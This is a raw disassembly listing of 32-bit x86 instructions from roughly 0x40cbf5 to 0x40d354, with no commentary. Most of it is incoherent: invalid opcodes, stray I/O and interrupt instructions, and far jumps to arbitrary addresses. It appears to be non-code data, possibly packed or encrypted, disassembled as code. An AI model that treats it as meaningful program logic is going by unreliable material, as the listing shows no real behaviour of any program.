  40cbf5:	or     al,BYTE PTR [ebx]
  40cbf7:	push   0xdfca35dd
  40cbfc:	retf   
  40cbfd:	outs   dx,BYTE PTR ds:[esi]
  40cbfe:	dec    ebp
  40cbff:	(bad)  
  40cc00:	popf   
  40cc01:	xchg   ebx,eax
  40cc02:	stos   DWORD PTR es:[edi],eax
  40cc03:	sub    eax,0xd6e85b54
  40cc08:	outs   dx,DWORD PTR ds:[esi]
  40cc09:	cmp    BYTE PTR [esi-0x636684f9],dl
  40cc0f:	lds    esi,FWORD PTR [ecx]
  40cc11:	addr16 dec edx
  40cc13:	repnz push edx
  40cc15:	test   al,0x9c
  40cc17:	or     BYTE PTR [eax+0x49],0xad
  40cc1b:	add    BYTE PTR [esi+0x25b584d0],bh
  40cc21:	fcomp  QWORD PTR [si+0x35]
  40cc25:	leave  
  40cc26:	leave  
  40cc27:	xchg   edi,eax
  40cc28:	call   0xa193:0x17fac7e7
  40cc2f:	mov    bh,0x20
  40cc31:	ret    
  40cc32:	or     al,0xa7
  40cc34:	stc    
  40cc35:	out    0xda,al
  40cc37:	sbb    eax,0xd21c53d3
  40cc3c:	cli    
  40cc3d:	mov    ds:0x90ba8e75,eax
  40cc42:	sahf   
  40cc43:	and    edi,DWORD PTR [ecx+ebx*2-0x58be119f]
  40cc4a:	push   esp
  40cc4b:	test   BYTE PTR [ebx-0x4b],dh
  40cc4e:	neg    DWORD PTR [ebp-0x30cb9ff8]
  40cc54:	dec    edx
  40cc55:	arpl   WORD PTR [ebx],bp
  40cc57:	pop    ebp
  40cc58:	mov    bh,0x15
  40cc5a:	jne    0x40cc8b
  40cc5c:	fcomp  QWORD PTR [edx+esi*8]
  40cc5f:	xchg   ecx,eax
  40cc60:	push   0xffffffb4
  40cc62:	or     DWORD PTR [edi+0x487240f],ebx
  40cc68:	enter  0x3c96,0xa
  40cc6c:	cwde   
  40cc6d:	sub    eax,0x4d1defe6
  40cc72:	dec    ebx
  40cc73:	sub    esp,DWORD PTR [eax]
  40cc75:	in     al,0x40
  40cc77:	arpl   WORD PTR [esi-0x63],bp
  40cc7a:	xchg   ebx,eax
  40cc7b:	pop    esi
  40cc7c:	fiadd  WORD PTR [ebp+edi*1+0x39755e40]
  40cc83:	or     al,0xc7
  40cc85:	and    BYTE PTR [edx],bh
  40cc87:	jl     0x40ccd3
  40cc89:	jle    0x40cc7a
  40cc8b:	xchg   esp,eax
  40cc8c:	std    
  40cc8d:	fiadd  DWORD PTR [eax-0x98aae86]
  40cc93:	push   edx
  40cc94:	scas   eax,DWORD PTR es:[edi]
  40cc95:	test   al,0x2e
  40cc97:	lea    eax,[ebx+0x9]
  40cc9a:	rol    ah,cl
  40cc9c:	push   eax
  40cc9d:	mov    dh,0x92
  40cc9f:	sub    al,al
  40cca1:	jmp    0xa474b367
  40cca6:	ret    0xb72a
  40cca9:	fbld   TBYTE PTR [esi-0x2d]
  40ccac:	retf   
  40ccad:	int    0xcf
  40ccaf:	(bad)  
  40ccb0:	aam    0x63
  40ccb2:	xchg   esp,eax
  40ccb3:	lods   eax,DWORD PTR ds:[esi]
  40ccb4:	cs jmp 0x40ccca
  40ccb7:	xchg   ecx,eax
  40ccb8:	xor    ebp,DWORD PTR [eax]
  40ccba:	aam    0x51
  40ccbc:	and    cl,BYTE PTR [ecx+0x19c91517]
  40ccc2:	jns    0x40ccd6
  40ccc4:	rcl    DWORD PTR ds:[esi],0xc0
  40ccc8:	xchg   ebx,eax
  40ccc9:	pop    esi
  40ccca:	xchg   edx,eax
  40cccb:	mov    eax,0xb1183608
  40ccd0:	pop    ss
  40ccd1:	mov    ss,edi
  40ccd3:	repnz and al,0x1
  40ccd6:	or     DWORD PTR [ebp-0x75c60e2f],edx
  40ccdc:	add    eax,0xa625f05f
  40cce1:	sbb    al,BYTE PTR [ebp+0x45ce3b4f]
  40cce7:	fs aam 0x21
  40ccea:	xor    DWORD PTR [edi-0x7f],0x937e84b0
  40ccf1:	call   FWORD PTR [edx]
  40ccf3:	in     eax,dx
  40ccf4:	out    0xe4,eax
  40ccf6:	jb     0x40cd4b
  40ccf8:	and    BYTE PTR [esi+0x4c4c06f7],0xc5
  40ccff:	add    eax,0x6cb7635e
  40cd04:	(bad)  
  40cd05:	mov    dh,0x73
  40cd07:	dec    ebp
  40cd08:	or     ah,BYTE PTR [ebx]
  40cd0a:	cmp    DWORD PTR [bp+0xe],ebx
  40cd0e:	call   0x2cb72aa5
  40cd13:	mov    edi,0x56e56b97
  40cd18:	jmp    DWORD PTR [esi+0x25]
  40cd1b:	adc    bl,bl
  40cd1d:	test   DWORD PTR [edi+0x47],edi
  40cd20:	xlat   BYTE PTR ds:[ebx]
  40cd21:	aad    0x6c
  40cd23:	mov    dh,0x5d
  40cd25:	inc    ebx
  40cd26:	mov    gs,eax
  40cd28:	out    dx,eax
  40cd29:	mov    ebp,0xa1d3f8ae
  40cd2e:	jge    0x40cd32
  40cd30:	mov    edx,0x777b0521
  40cd35:	mov    bh,0xc
  40cd37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd38:	mov    cl,0x3d
  40cd3a:	into   
  40cd3b:	dec    ecx
  40cd3c:	ins    BYTE PTR es:[edi],dx
  40cd3d:	aaa    
  40cd3e:	int3   
  40cd3f:	xchg   ebx,eax
  40cd40:	hlt    
  40cd41:	idiv   BYTE PTR [edi+eiz*1+0x18d3f435]
  40cd48:	pop    esp
  40cd49:	adc    BYTE PTR [esi-0x11978819],dh
  40cd4f:	test   BYTE PTR [esi],al
  40cd51:	add    DWORD PTR [ecx],0x46
  40cd54:	push   ebx
  40cd55:	and    BYTE PTR [ebp-0x80],bh
  40cd58:	xor    esp,DWORD PTR [esi]
  40cd5a:	stos   BYTE PTR es:[edi],al
  40cd5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd5c:	mov    dh,0xb9
  40cd5e:	popa   
  40cd5f:	clc    
  40cd60:	(bad)  
  40cd61:	mov    ch,BYTE PTR [ebx-0x2d]
  40cd64:	dec    esi
  40cd65:	sbb    DWORD PTR [edi],0xb75600e7
  40cd6b:	das    
  40cd6c:	(bad)  
  40cd6d:	jp     0x40cd8e
  40cd6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd70:	push   es
  40cd71:	cmc    
  40cd72:	or     edx,DWORD PTR [ebx-0x1c6e5841]
  40cd78:	bound  esi,QWORD PTR [edx]
  40cd7a:	aaa    
  40cd7b:	add    ecx,ecx
  40cd7d:	xchg   ebp,eax
  40cd7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd7f:	and    al,BYTE PTR [edi+0x33]
  40cd82:	fadd   DWORD PTR [eax-0x3f4527b5]
  40cd88:	dec    eax
  40cd89:	inc    edi
  40cd8a:	lods   eax,DWORD PTR ds:[esi]
  40cd8b:	das    
  40cd8c:	adc    DWORD PTR [ebx-0x77],eax
  40cd8f:	ins    DWORD PTR es:[edi],dx
  40cd90:	mov    eax,ss:0xae39feb0
  40cd96:	push   eax
  40cd97:	inc    esp
  40cd98:	jbe    0x40cdaf
  40cd9a:	sbb    eax,0xd9c2c8f5
  40cd9f:	push   edi
  40cda0:	pop    edx
  40cda1:	pusha  
  40cda2:	mov    ?,WORD PTR [eax+0x44]
  40cda5:	mov    ecx,0x28882993
  40cdaa:	cmc    
  40cdab:	shl    BYTE PTR [edx],cl
  40cdad:	xor    dl,BYTE PTR [edx-0x12c248d0]
  40cdb3:	or     BYTE PTR [eax-0x278174ba],0x1b
  40cdba:	mov    edx,0x9d30a286
  40cdbf:	jge    0x40cd7c
  40cdc1:	shl    BYTE PTR [edi-0x2066ec44],cl
  40cdc7:	das    
  40cdc8:	mov    gs,WORD PTR [ebx-0x1ce761ec]
  40cdce:	mov    edi,0xfa12c31e
  40cdd3:	int    0x6a
  40cdd5:	sub    al,0x92
  40cdd7:	sub    al,0x69
  40cdd9:	rcl    BYTE PTR [edx-0x8],cl
  40cddc:	icebp  
  40cddd:	xchg   ecx,eax
  40cdde:	sbb    BYTE PTR [eax+0x64],ch
  40cde1:	pop    edx
  40cde2:	mov    ah,0x91
  40cde4:	dec    eax
  40cde5:	jp     0x40ce1f
  40cde7:	addr16 jno 0x40cda8
  40cdea:	ss cmc 
  40cdec:	in     al,dx
  40cded:	div    DWORD PTR [edx-0x2ac35024]
  40cdf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdf4:	aad    0xbb
  40cdf6:	push   ebp
  40cdf7:	mov    bh,0xdb
  40cdf9:	adc    BYTE PTR [ebp-0x1],bl
  40cdfc:	sbb    dh,BYTE PTR [edi-0x7a65957d]
  40ce02:	in     eax,dx
  40ce03:	dec    ebp
  40ce04:	(bad)  
  40ce05:	fcom   DWORD PTR [edi+0x69]
  40ce08:	ret    0xec1b
  40ce0b:	xchg   esi,eax
  40ce0c:	sbb    eax,0xa75b6dcf
  40ce11:	in     al,0x57
  40ce13:	fs call 0xd2ca:0x9777d2ff
  40ce1b:	push   edx
  40ce1c:	pop    esp
  40ce1d:	cmc    
  40ce1e:	dec    ebp
  40ce1f:	lods   eax,DWORD PTR ds:[esi]
  40ce20:	xor    bl,dl
  40ce22:	aam    0x34
  40ce24:	nop
  40ce25:	leave  
  40ce26:	sub    dl,BYTE PTR [ebx-0x7c]
  40ce29:	pop    es
  40ce2a:	add    cl,dl
  40ce2c:	push   es
  40ce2d:	out    0x76,al
  40ce2f:	cli    
  40ce30:	mov    al,0x39
  40ce32:	push   ebp
  40ce33:	and    esp,0x51
  40ce36:	add    ebp,DWORD PTR [edi-0x29b4ab68]
  40ce3c:	cmp    al,0xe2
  40ce3e:	std    
  40ce3f:	xchg   ebp,eax
  40ce40:	cmp    eax,0xff506080
  40ce45:	fwait
  40ce46:	pop    ecx
  40ce47:	fs sbb eax,0xbed1ff0c
  40ce4d:	mov    ch,0xf3
  40ce4f:	and    dl,bh
  40ce51:	(bad)  
  40ce52:	pop    edi
  40ce53:	sti    
  40ce54:	xchg   esp,eax
  40ce55:	aad    0xcc
  40ce57:	data16 outs dx,BYTE PTR ds:[esi]
  40ce59:	sub    cl,BYTE PTR [edx+edx*8]
  40ce5c:	(bad)  
  40ce5e:	data16 jo 0x40ce3f
  40ce61:	push   esi
  40ce62:	ja     0x40ce2a
  40ce64:	jmp    0x34dd:0x86e029e9
  40ce6b:	je     0x40ce55
  40ce6d:	and    BYTE PTR [edx+0x6d],bl
  40ce70:	xor    ebx,edx
  40ce72:	pop    esp
  40ce73:	arpl   WORD PTR [eax],di
  40ce75:	xchg   ecx,eax
  40ce76:	loopne 0x40ce07
  40ce78:	fs ret 0x7f4e
  40ce7c:	enter  0x30c5,0x6f
  40ce80:	xchg   ecx,eax
  40ce81:	test   DWORD PTR [ebx],eax
  40ce83:	jg     0x40cef1
  40ce85:	pop    ss
  40ce86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce87:	repz jae 0x40ce20
  40ce8a:	repz enter 0x990b,0x97
  40ce8f:	imul   edx,DWORD PTR [ebx+esi*4-0x47],0x8
  40ce94:	mov    DWORD PTR [ebx+0x732b7b30],ebp
  40ce9a:	cmp    eax,0xd58a7a28
  40ce9f:	adc    DWORD PTR [eiz*2+0x36105e69],0x9455d775
  40ceaa:	xchg   esp,ebx
  40ceac:	sbb    dh,BYTE PTR [ebx-0x1a2059a8]
  40ceb2:	js     0x40ce59
  40ceb4:	mov    esp,0x439b2e56
  40ceb9:	jb     0x40ce59
  40cebb:	lock cmp edx,ecx
  40cebe:	popa   
  40cebf:	addr16 icebp 
  40cec1:	add    bh,bl
  40cec3:	fisub  WORD PTR [edx-0x20a39d8a]
  40cec9:	cwde   
  40ceca:	and    DWORD PTR [ecx],ecx
  40cecc:	or     esi,DWORD PTR [edx-0x71]
  40cecf:	push   0xf593ac79
  40ced4:	mov    ebx,0xc614993a
  40ced9:	and    edx,DWORD PTR [eax-0x52]
  40cedc:	aas    
  40cedd:	cmc    
  40cede:	mov    dh,0x87
  40cee0:	fiadd  WORD PTR [ebx+eax*2+0x6b337d36]
  40cee7:	test   al,0xf2
  40cee9:	cmp    dl,bh
  40ceeb:	push   ecx
  40ceec:	jns    0x40cf30
  40ceee:	dec    esp
  40ceef:	mov    ecx,0xbb54e27d
  40cef4:	cmp    al,0xb8
  40cef7:	jmp    0x83c3:0xf73db2b2
  40cefe:	aad    0xd
  40cf00:	jl     0x40ce8f
  40cf02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf03:	ror    DWORD PTR [eax],1
  40cf05:	and    BYTE PTR [ecx-0x7f],0xf
  40cf09:	je     0x40ced0
  40cf0b:	inc    esi
  40cf0c:	in     eax,dx
  40cf0d:	cmp    ebp,DWORD PTR [ebp-0x26d56636]
  40cf13:	into   
  40cf14:	inc    edx
  40cf15:	sub    al,bl
  40cf17:	in     eax,0x68
  40cf19:	mov    cl,0x1d
  40cf1b:	sbb    bh,BYTE PTR [ecx]
  40cf1d:	sbb    ch,ch
  40cf1f:	sbb    eax,0xd966d7ce
  40cf24:	ins    BYTE PTR es:[edi],dx
  40cf25:	push   ds
  40cf26:	mov    eax,ds:0x2379d97d
  40cf2b:	xchg   esp,eax
  40cf2c:	repnz xor ch,ah
  40cf2f:	push   edx
  40cf30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf31:	ret    
  40cf32:	mov    ebp,ss
  40cf34:	fidivr DWORD PTR [ecx+0x7bb47031]
  40cf3a:	sbb    DWORD PTR [ecx-0x3e],ebx
  40cf3d:	lds    esp,FWORD PTR [ebp-0x16189b32]
  40cf43:	test   al,0x46
  40cf45:	mov    dh,BYTE PTR [esp+edi*2+0x1e001f06]
  40cf4c:	out    0xc,eax
  40cf4e:	loop   0x40cedf
  40cf50:	push   ds
  40cf51:	(bad)  
  40cf52:	mov    esi,0x41616c98
  40cf57:	mov    eax,0x1dc16b1a
  40cf5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf5d:	sub    edi,ebp
  40cf5f:	xchg   ebp,eax
  40cf60:	add    eax,0x53
  40cf63:	or     ah,BYTE PTR [edi+ebp*1-0x115b0f88]
  40cf6a:	xchg   al,ch
  40cf6c:	scas   al,BYTE PTR es:[edi]
  40cf6d:	pushf  
  40cf6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf6f:	mov    esi,0x185b0f0f
  40cf74:	sar    BYTE PTR [ecx+0x57],cl
  40cf77:	retf   
  40cf78:	sub    DWORD PTR [ecx],esp
  40cf7a:	add    edx,ecx
  40cf7c:	xor    edx,ebx
  40cf7e:	mov    ebx,DWORD PTR ds:0x434014
  40cf84:	or     DWORD PTR ds:0x436018,ebx
  40cf8a:	mov    DWORD PTR [ebp-0x50],edx
  40cf8d:	mov    edx,DWORD PTR [ebp+0x8]
  40cf90:	mov    ebx,DWORD PTR ds:0x434020
  40cf96:	sbb    DWORD PTR ds:0x43401c,ebx
  40cf9c:	mov    ebx,DWORD PTR [ebp-0x4c]
  40cf9f:	jmp    0x40f353
  40cfa4:	mov    DWORD PTR [edi+0x2c],0x73f3ac7a
  40cfab:	ret    
  40cfac:	xchg   esp,eax
  40cfad:	cs or  al,0xd2
  40cfb0:	mov    esp,0x65047ff0
  40cfb5:	loop   0x40d033
  40cfb7:	jl     0x40cfa4
  40cfb9:	pop    edi
  40cfba:	jl     0x40d038
  40cfbc:	sub    al,0x6b
  40cfbe:	jle    0x40cf75
  40cfc0:	loopne 0x40cf87
  40cfc2:	ds popf 
  40cfc4:	lods   eax,DWORD PTR ds:[esi]
  40cfc5:	xchg   ah,bl
  40cfc7:	test   DWORD PTR [ecx],esi
  40cfc9:	fwait
  40cfca:	jecxz  0x40cfc8
  40cfcc:	sbb    al,BYTE PTR [edi-0x2b]
  40cfcf:	cmp    esi,DWORD PTR [edx+0x4d0847a0]
  40cfd5:	fs (bad) 
  40cfd7:	int    0x1b
  40cfd9:	neg    BYTE PTR ds:0x7a2edf24
  40cfdf:	dec    esi
  40cfe0:	mov    edx,DWORD PTR [ecx+0x56013489]
  40cfe6:	dec    ecx
  40cfe7:	sbb    DWORD PTR ds:0x75f58aa,eax
  40cfed:	loopne 0x40cfe3
  40cfef:	int3   
  40cff0:	gs retf 
  40cff2:	mov    al,0x1
  40cff4:	dec    edx
  40cff5:	sbb    ecx,DWORD PTR [ebx-0x6cd2a148]
  40cffb:	test   ah,0xb9
  40cffe:	scas   al,BYTE PTR es:[edi]
  40cfff:	jle    0x40cfd7
  40d001:	stc    
  40d002:	xchg   esi,eax
  40d003:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d004:	xor    DWORD PTR [eax-0x69],0x1b4ea58c
  40d00b:	sbb    al,0x6f
  40d00d:	add    DWORD PTR [edi],ebx
  40d00f:	mov    esi,0x492f4406
  40d014:	xor    al,0xd3
  40d016:	pop    ss
  40d017:	pushf  
  40d018:	xchg   ebp,eax
  40d019:	add    BYTE PTR [ecx-0x1d616b68],cl
  40d01f:	push   0x7b51abba
  40d024:	push   eax
  40d025:	pop    eax
  40d026:	pop    esp
  40d027:	xchg   DWORD PTR [eax+0x3f],esp
  40d02a:	mov    esp,0xfeda75f2
  40d02f:	enter  0xc845,0x33
  40d033:	inc    esi
  40d034:	mov    esi,0xc35d6ecf
  40d039:	(bad)  
  40d03a:	mov    esi,DWORD PTR [ebx]
  40d03c:	adc    eax,0xc348049e
  40d041:	(bad)  
  40d042:	sub    eax,0xa92f3e06
  40d047:	leave  
  40d048:	and    BYTE PTR [ebx+0x6b4e7126],cl
  40d04e:	and    ebp,DWORD PTR [edi+0x5585895d]
  40d054:	rol    DWORD PTR [eax-0x58],cl
  40d057:	xchg   esi,eax
  40d058:	inc    eax
  40d059:	xor    eax,0xed5a4381
  40d05e:	jno    0x40d0d3
  40d060:	enter  0x3ef,0x33
  40d064:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d065:	leave  
  40d066:	sub    al,0x47
  40d068:	dec    edx
  40d069:	sbb    BYTE PTR [esi+0x37cc6cb1],bh
  40d06f:	xchg   ebp,eax
  40d070:	sub    eax,0x94ca235a
  40d075:	mov    edx,0x27e90bc
  40d07a:	jo     0x40d00d
  40d07c:	xor    cl,ah
  40d07e:	adc    esi,DWORD PTR [ebx-0x4c]
  40d081:	adc    ah,BYTE PTR [eax-0x78]
  40d084:	sub    al,0xf9
  40d086:	xor    BYTE PTR [ebx+0xca0c01e],ch
  40d08c:	add    ebx,DWORD PTR [ebx+0x603e5c]
  40d092:	sbb    eax,0x186b938
  40d097:	pusha  
  40d098:	xchg   ecx,eax
  40d099:	xchg   BYTE PTR [esi+0x26],ah
  40d09c:	xlat   BYTE PTR ds:[ebx]
  40d09d:	xchg   ecx,eax
  40d09e:	imul   edi,DWORD PTR [ebx-0x512619c0],0xffffffa0
  40d0a5:	jb     0x40d115
  40d0a7:	adc    bh,BYTE PTR ds:0x6cc636ce
  40d0ad:	inc    edx
  40d0ae:	adc    BYTE PTR [eax-0x6b],bl
  40d0b1:	xor    DWORD PTR [edx],edx
  40d0b3:	js     0x40d107
  40d0b5:	mov    esp,0x2854ed27
  40d0ba:	cli    
  40d0bb:	test   eax,0xfbc5c54d
  40d0c0:	in     al,0x20
  40d0c2:	(bad)  
  40d0c3:	jmp    0x40d0e1
  40d0c5:	mov    ecx,0xe01c1053
  40d0ca:	pop    edi
  40d0cb:	jp     0x40d050
  40d0cd:	es enter 0xef17,0xa
  40d0d2:	and    dl,BYTE PTR [esi]
  40d0d4:	stos   BYTE PTR es:[edi],al
  40d0d5:	aas    
  40d0d6:	icebp  
  40d0d7:	retf   
  40d0d8:	rcr    DWORD PTR [ecx-0x2571271],1
  40d0de:	add    esp,edi
  40d0e0:	cwde   
  40d0e1:	dec    edi
  40d0e2:	sbb    eax,DWORD PTR [edi]
  40d0e4:	dec    edx
  40d0e5:	mov    ebp,0x5ed6352a
  40d0ea:	push   edi
  40d0eb:	pop    edx
  40d0ec:	(bad)  
  40d0ed:	mov    bh,0x2c
  40d0ef:	pop    ebp
  40d0f0:	retf   
  40d0f1:	mov    eax,0x6fd3d85d
  40d0f6:	push   0x34dd3fd8
  40d0fb:	push   esp
  40d0fc:	das    
  40d0fd:	and    BYTE PTR [ecx],dh
  40d0ff:	ja     0x40d111
  40d101:	cmp    esi,DWORD PTR [esi]
  40d103:	fwait
  40d104:	jns    0x40d14d
  40d106:	das    
  40d107:	mov    bh,0xca
  40d109:	je     0x40d120
  40d10b:	xchg   edi,eax
  40d10c:	mov    cl,BYTE PTR [eax]
  40d10e:	or     eax,0xe051d047
  40d113:	mov    eax,0xbbab6357
  40d118:	mov    ah,0x7
  40d11a:	retf   0xe17a
  40d11d:	pushf  
  40d11e:	jle    0x40d0af
  40d120:	sub    ebx,0x45
  40d123:	push   ebp
  40d124:	cmc    
  40d125:	test   al,0xc1
  40d127:	arpl   bp,bx
  40d129:	xor    bh,al
  40d12b:	out    dx,eax
  40d12c:	mov    ebp,DWORD PTR [ecx+0x9]
  40d12f:	test   DWORD PTR [edx+0x19901329],ebp
  40d135:	jp     0x40d126
  40d137:	dec    ebp
  40d138:	adc    dh,BYTE PTR [eax+0x11]
  40d13b:	push   edi
  40d13c:	fwait
  40d13d:	dec    edi
  40d13e:	aaa    
  40d13f:	mov    bh,0x16
  40d141:	add    esp,esp
  40d143:	pop    ecx
  40d144:	pusha  
  40d145:	xor    al,0x6a
  40d147:	inc    BYTE PTR [ebp+esi*2-0x49]
  40d14b:	pop    ds
  40d14c:	mov    esp,0x1eccfa36
  40d151:	xchg   ebx,eax
  40d152:	aam    0xa1
  40d154:	icebp  
  40d155:	stos   BYTE PTR es:[edi],al
  40d156:	scas   eax,DWORD PTR es:[edi]
  40d157:	dec    ecx
  40d158:	xlat   BYTE PTR ds:[ebx]
  40d159:	cmp    al,0xaa
  40d15b:	push   edi
  40d15c:	dec    edi
  40d15d:	mov    ds:0x4716844c,eax
  40d162:	mov    cl,0xca
  40d164:	inc    edx
  40d165:	sti    
  40d166:	pop    edx
  40d167:	jmp    0xdd6b:0x2b37a51c
  40d16e:	test   eax,0x394b2164
  40d173:	mov    ebx,0x52445e6d
  40d178:	lods   eax,DWORD PTR ds:[esi]
  40d179:	iret   
  40d17a:	pop    eax
  40d17b:	loopne 0x40d156
  40d17d:	loop   0x40d1b1
  40d17f:	aad    0xc7
  40d181:	cmp    dh,BYTE PTR [ebx+esi*1]
  40d184:	(bad)  
  40d185:	xchg   ebp,eax
  40d186:	rcr    BYTE PTR [edx+0x47],1
  40d189:	hlt    
  40d18a:	mov    dl,0xcc
  40d18c:	inc    edi
  40d18d:	jmp    0x70cb507d
  40d192:	data16 jns 0x40d1a8
  40d195:	fist   DWORD PTR [edx]
  40d197:	xlat   BYTE PTR ds:[ebx]
  40d198:	cld    
  40d199:	jg     0x40d171
  40d19b:	push   0x13
  40d19d:	mov    ds:0x973212,al
  40d1a2:	fnsave [ebp+0x62]
  40d1a5:	sbb    edi,DWORD PTR [ebp+eiz*8-0x7556ef84]
  40d1ac:	mov    ecx,0x398843a0
  40d1b1:	mov    ?,edi
  40d1b3:	shl    cl,1
  40d1b5:	dec    ebp
  40d1b6:	sub    eax,0xa5bcd07
  40d1bb:	adc    eax,0x96b0142c
  40d1c0:	imul   ebx,DWORD PTR [esi-0x42533c50],0x37
  40d1c7:	mov    eax,DWORD PTR [esi]
  40d1c9:	ficomp DWORD PTR [ebp+0x74]
  40d1cc:	pop    eax
  40d1cd:	or     eax,0xa5e7764f
  40d1d2:	xor    ecx,DWORD PTR [edi-0x364af417]
  40d1d8:	or     ecx,esi
  40d1da:	adc    BYTE PTR [ecx+0x53ff65a],cl
  40d1e0:	ss jle 0x40d17f
  40d1e3:	add    cl,0x9c
  40d1e6:	jnp    0x40d16f
  40d1e8:	push   0x6a
  40d1ea:	(bad)  
  40d1eb:	jnp    0x40d207
  40d1ed:	sub    eax,0x4053ad57
  40d1f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1f3:	inc    ebp
  40d1f4:	lahf   
  40d1f5:	jg     0x40d1b9
  40d1f7:	adc    ch,BYTE PTR [edi+0x8]
  40d1fa:	add    ebx,DWORD PTR [ebx-0x56]
  40d1fd:	dec    ecx
  40d1fe:	inc    edx
  40d1ff:	div    dl
  40d201:	test   al,0x13
  40d203:	pop    es
  40d204:	push   cs
  40d205:	jns    0x40d198
  40d207:	mov    BYTE PTR [edx-0x71],bh
  40d20a:	mov    ebx,0x2f4ed055
  40d20f:	mov    esp,0xacb1e095
  40d214:	or     eax,0x98af318
  40d219:	sbb    eax,0x6b7b634a
  40d21e:	mov    ebx,0xb514c7b6
  40d223:	popa   
  40d224:	mov    ?,WORD PTR [ebx-0x3f]
  40d227:	rep stos DWORD PTR es:[edi],eax
  40d229:	jo     0x40d1ab
  40d22b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d22c:	push   ebx
  40d22d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d22e:	imul   esp,esp,0xffffffa4
  40d231:	pinsrw mm4,WORD PTR [ebp+0x26],0xf9
  40d236:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d237:	arpl   WORD PTR [edx],dx
  40d239:	dec    eax
  40d23a:	(bad)  
  40d23b:	sub    al,0x2d
  40d23d:	fs aad 0xb3
  40d240:	and    bh,0x84
  40d243:	xor    ebp,DWORD PTR [ecx-0xf]
  40d246:	repz aad 0x70
  40d249:	test   BYTE PTR [ecx],ah
  40d24b:	mov    edx,0xa344829d
  40d250:	xchg   ecx,eax
  40d251:	sub    ah,BYTE PTR [edx]
  40d253:	test   BYTE PTR [esi+0x2009637a],ch
  40d259:	sbb    al,0x3d
  40d25b:	cs scas eax,DWORD PTR es:[edi]
  40d25d:	mov    dl,bl
  40d25f:	lds    esp,FWORD PTR [edi]
  40d261:	in     eax,0xcb
  40d263:	adc    BYTE PTR [ebp-0x7e3662a8],ch
  40d269:	mov    cl,0x9c
  40d26b:	daa    
  40d26c:	lock pop ebp
  40d26e:	cmp    DWORD PTR [eax+0x449f612f],edi
  40d274:	scas   eax,DWORD PTR es:[edi]
  40d275:	ss and ebx,ebp
  40d278:	int3   
  40d279:	popf   
  40d27a:	aad    0xb2
  40d27c:	ret    
  40d27d:	mov    BYTE PTR [eax-0x4d],al
  40d280:	test   edi,0xa82d4532
  40d286:	int    0x37
  40d288:	mov    ebp,0x1efaa31e
  40d28d:	pop    es
  40d28e:	sbb    BYTE PTR [esi],cl
  40d290:	std    
  40d291:	dec    ebx
  40d292:	fisubr DWORD PTR [ebp+edx*4+0xb]
  40d296:	fist   DWORD PTR [edx-0x4f71fc3a]
  40d29c:	aas    
  40d29d:	and    al,0xf
  40d29f:	and    ebp,DWORD PTR [ebx-0x7882d3e]
  40d2a5:	adc    edx,eax
  40d2a7:	das    
  40d2a8:	stos   DWORD PTR es:[edi],eax
  40d2a9:	mov    bl,0x2c
  40d2ab:	imul   esi,ebx,0x80ca9ec9
  40d2b1:	scas   al,BYTE PTR es:[edi]
  40d2b2:	and    ecx,DWORD PTR [eax-0x75]
  40d2b5:	inc    esp
  40d2b6:	cmc    
  40d2b7:	mov    DWORD PTR ds:0x8606cf04,ebx
  40d2bd:	sar    DWORD PTR [edi+0x5d247806],cl
  40d2c3:	rcr    BYTE PTR [ecx+0x4],0x63
  40d2c7:	mov    dh,0x9f
  40d2c9:	(bad)  
  40d2cb:	retf   0x38a8
  40d2ce:	dec    ebx
  40d2cf:	mov    bl,0xdd
  40d2d1:	pusha  
  40d2d2:	sub    bl,BYTE PTR [ecx]
  40d2d4:	inc    esp
  40d2d5:	add    ebx,0x1f
  40d2d8:	cmp    ebx,DWORD PTR [edi-0x41]
  40d2db:	adc    BYTE PTR [ebp-0x1437edba],dh
  40d2e1:	adc    BYTE PTR [edx+0x18],dl
  40d2e4:	clc    
  40d2e5:	icebp  
  40d2e6:	push   ss
  40d2e7:	sar    BYTE PTR [edx+0x1e],0xf7
  40d2eb:	(bad)
  40d2ee:	dec    ebp
  40d2ef:	ror    DWORD PTR [edi-0x4],cl
  40d2f2:	loopne 0x40d346
  40d2f4:	xor    bl,bl
  40d2f6:	cdq    
  40d2f7:	hlt    
  40d2f8:	fadd   st,st(2)
  40d2fa:	(bad)  
  40d2fb:	jmp    0x602f:0x6cf4fa1a
  40d302:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d303:	xchg   ebp,eax
  40d304:	xor    al,0x1c
  40d306:	pop    es
  40d307:	stc    
  40d308:	sbb    BYTE PTR [ebx-0x72e0bcae],0xe
  40d30f:	jmp    0x47928a4e
  40d314:	add    al,BYTE PTR [eax]
  40d316:	sub    esi,eax
  40d318:	mov    cl,0x9c
  40d31a:	sub    DWORD PTR [ecx-0x70],ebx
  40d31d:	out    dx,al
  40d31e:	int    0x85
  40d320:	and    al,0x1f
  40d322:	fwait
  40d323:	mov    eax,0x38e36df7
  40d328:	sub    al,0x95
  40d32a:	pop    edi
  40d32b:	int    0x57
  40d32d:	mov    bl,0x36
  40d32f:	pop    ds
  40d330:	inc    eax
  40d331:	xor    BYTE PTR [esi+0xddb72ef],0x26
  40d338:	fisub  DWORD PTR [ecx+0x60f29c81]
  40d33e:	mov    ds:0x8e79a306,al
  40d343:	or     al,0x62
  40d345:	retf   0xc6b0
  40d348:	mov    BYTE PTR [eax],ch
  40d34a:	ss dec edi
  40d34c:	xchg   edi,eax
  40d34d:	xchg   ebx,edx
  40d34f:	pop    esp
  40d350:	aam    0xe6
  40d352:	scas   eax,DWORD PTR es:[edi]
  40d353:	nop
  40d354:	gs or  eax,0xf55aaafa
